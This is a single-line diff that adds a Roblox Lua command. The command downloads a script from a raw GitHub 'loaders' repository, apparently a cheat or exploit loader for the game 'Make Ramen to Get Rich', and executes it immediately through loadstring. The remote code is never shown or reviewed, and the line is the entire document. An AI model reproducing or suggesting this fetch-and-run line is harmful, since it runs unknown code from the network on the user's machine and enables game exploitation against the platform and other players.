@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/make-ramen-to-get-rich-release-spam5-9ojbg8xsoa8x57.lua"))()
